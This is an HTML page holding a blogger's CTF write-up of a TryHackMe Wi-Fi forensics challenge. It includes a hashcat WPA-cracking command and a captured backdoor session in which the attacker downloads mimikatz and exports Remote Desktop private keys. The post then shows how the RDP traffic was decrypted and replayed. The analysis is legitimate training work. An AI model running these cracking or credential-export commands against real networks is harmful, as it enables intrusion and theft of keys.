@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html>
+    <head lang="en">
+        <meta charset="utf-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>Return of the Yeti - ~/xv1&#39;s projects</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link href="../../../css/fonts.css" rel="stylesheet">
+        <link rel="stylesheet" type="text/css" media="screen" href="../../../css/main.css" />
+    </head>
+    <body>
+        <div class="content">
+            <header>
+                <div class="main">
+                    <a href="../../../index.html">~/xv1&#39;s projects</a>
+                </div>
+                <nav>
+                    
+                    
+                    <a href="../../../writeups/index.html">./writeups</a>
+                </nav>
+            </header>
+            <main>
+                <article>
+                    <div class="title">
+                        <h1 class="title">Return of the Yeti</h1>
+                        <div class="meta">Posted on Dec 30, 2023</div>
+                    </div>
+                    <div class="post-tags">
+                        <nav class="nav tags">
+                            <ul class="tags">
+                                <li><a href="/tagsthm">thm</a></li>
+                            </ul>
+                        </nav>
+                    </div>
+                    <section class="body">
+                        <blockquote>
+                            <p>AoC Side Quest Ctf<br>
+                                The Yeti needs a plan for 2023. Help him out!
+                            </p>
+                        </blockquote>
+                        <ul>
+                            <li>So serious I almost lost my marbles on four separate occasions trying to finish this</li>
+                        </ul>
+                        <h4 id="question-1">Question 1</h4>
+                        <ul>
+                            <li>Finding the name of the wifi network was easy</li>
+                            <li>Upzip the .pcapng file, load it into wireshark, and you see pretty quickly that the SSID is <code>FreeWifiBFC</code></li>
+                        </ul>
+                        <h4 id="question-2">Question 2</h4>
+                        <ul>
+                            <li>To find the password, first use this site: <a href="http://hashcat.net/cap2hashcat/">http://hashcat.net/cap2hashcat/</a> to extract the handshake file w the pass hash, then use this command to crack it:</li>
+                        </ul>
+                        <div class="highlight">
+                            <pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">22000</span> &lt;path/to/hash/file&gt; /usr/share/wordlists/rockyou.txt.gz
+</span></span></code></pre>
+                        </div>
+                        <ul>
+                            <li>Two lines like this should appear in the results:</li>
+                        </ul>
+                        <pre tabindex="0"><code>af804935ab322d4b0bbd84a711c36f01:22c712c7e235:d267d13f36ec:FreeWifiBFC:Christmas
+c10a70d965945b57f2988ae0fcfd2b22:22c712c7e235:2a8449acf9d8:FreeWifiBFC:Christmas
+</code></pre>
+                        <h4 id="question-3">Question 3</h4>
+                        <ul>
+                            <li>Now that we have the wifi password, we can decrypt the traffic</li>
+                            <li>In wireshark, go to <code>Edit &gt; Preferences &gt; Protocols &gt; IEEE 802.11</code></li>
+                            <li>Usually, you can just load the decryption key like this <code>wpa-pwd|Christmas</code></li>
+                            <li>I also had to enable <code>Assume packets have FCS</code> for the decryption to work</li>
+                            <li>After that, there are other visible protocols and steams, such as <code>TCP</code></li>
+                            <li>There was a hint about backdoors in the room, and the usual <code>TCP</code> backdoor port is 4444</li>
+                            <li>Search <code>tcp.port == 4444</code>, find a <code>PSH ACK</code> packet, and follow the TCP steam</li>
+                            <li>You should get something like this:</li>
+                        </ul>
+                        <pre tabindex="0"><code>Windows PowerShell running as user Administrator on INTERN-PC
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+
+
+PS C:\Users\Administrator&gt; PS C:\Users\Administrator&gt;
+PS C:\Users\Administrator&gt; dir
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                LastWriteTime         Length Name
+
+----                -------------         ------ ----
+
+d-----       11/23/2023   9:47 PM                .ssh
+
+d-r---        3/17/2021   3:13 PM                3D Objects
+
+d-r---        3/17/2021   3:13 PM                Contacts
+
+d-r---       11/25/2023   2:12 PM                Desktop
+
+d-r---        3/17/2021   3:13 PM                Documents
+
+d-r---       11/24/2023  10:53 PM                Downloads
+
+d-r---        3/17/2021   3:13 PM                Favorites
+
+d-r---        3/17/2021   3:13 PM                Links
+
+d-r---        3/17/2021   3:13 PM                Music
+
+d-r---       11/24/2023  10:44 PM                Pictures
+
+d-r---        3/17/2021   3:13 PM                Saved Games
+
+d-r---        3/17/2021   3:13 PM                Searches
+
+d-r---        3/17/2021   3:13 PM                Videos
+
+-a----       11/25/2023   6:01 AM           8192 psh4444.exe
+
+
+
+PS C:\Users\Administrator&gt; whoami
+intern-pc\administrator
+PS C:\Users\Administrator&gt; wget http://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -O mimi.zip
+PS C:\Users\Administrator&gt; Expand-Archive .\mimi.zip
+PS C:\Users\Administrator&gt; mv mimi/x64/mimikatz.exe .
+PS C:\Users\Administrator&gt; cmd /c mimikatz.exe privilege::debug token::elevate crypto::capi &#34;crypto::certificates /systemstore:LOCAL_MACHINE /store:\`&#34;Remote Desktop\`&#34; /export&#34; exit
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
+ &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  &#39;#####&#39;        &gt; http://pingcastle.com / http://mysmartlogon.com ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege &#39;20&#39; OK
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+496     {0;000003e7} 1 D 16529          NT AUTHORITY\SYSTEM     S-1-5-18(04g,21p)       Primary
+ -&gt; Impersonated !
+ * Process Token : {0;0002bbfa} 2 D 25564822    INTERN-PC\AdministratorS-1-5-21-1966530601-3185510712-10604624-500      (14g,24p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 25609341    NT AUTHORITY\SYSTEM    S-1-5-18 (04g,21p)       Impersonation (Delegation)
+
+mimikatz(commandline) # crypto::capi
+Local CryptoAPI RSA CSP patched
+Local CryptoAPI DSS CSP patched
+
+mimikatz(commandline) # crypto::certificates /systemstore:LOCAL_MACHINE /store:&#34;Remote Desktop&#34; /export
+ * System Store  : &#39;LOCAL_MACHINE&#39; (0x00020000)
+ * Store         : &#39;Remote Desktop&#39;
+</code></pre>
+                        <ul>
+                            <li>(there&rsquo;s more but you get the point)</li>
+                            <li>From this we can determine that the tool they are running is <code>mimikatz</code></li>
+                        </ul>
+                        <h4 id="question-4">Question 4</h4>
+                        <ul>
+                            <li>The important part of the info we found for question 3 is that the attacker used a ps command to read a <code>.pfx</code> file and covert it to base64</li>
+                            <li>pfx files usually contain a public key, private key, and certificate chain, and they are usually used to store things like TLS certs</li>
+                            <li>we can use the pfx key to decrypt tls in wireshark</li>
+                            <li><code>edit &gt; preferences &gt; tls &gt; rsa keys list</code></li>
+                            <li>input <code>&lt;IP&gt; port - 3389 prc key file - /path/to/b64_decoded_pfx_file pass - mimikatz</code></li>
+                            <li>from here we find that the client is using RDP</li>
+                            <li>I exported specific RDP info for analysis with <code>file &gt; export PDUs to file &gt; OSI layer 7</code> and saved it to another .pcap file</li>
+                            <li>from here I used <code>pyrdp</code> to extract the interactions</li>
+                        </ul>
+                        <div class="highlight">
+                            <pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pyrdp-convert -f &lt;new file&gt; /path/to/exported/pcap
+</span></span><span style="display:flex;"><span>pyrdp-player &lt;new file&gt;.pyrdp
+</span></span></code></pre>
+                        </div>
+                        <ul>
+                            <li>after scrolling through the activity, I found the assigned case number in an email screencapture <code>31337-0</code></li>
+                        </ul>
+                        <h4 id="question-5">Question 5</h4>
+                        <ul>
+                            <li>The yeti key was also in the rdp replay in a clipboard data variable <code>1–f9548f131522e85ea30e801dfd9b1a4e526003f9e83301faad85e6154ef2834</code></li>
+                        </ul>
+                    </section>
+                    <div class="post-tags">
+                    </div>
+                </article>
+            </main>
+            <footer>
+                <div class="footer-info">
+                    xv1 2024-4L 
+                    
+                </div>
+            </footer>
+        </div>
+    </body>
+</html>
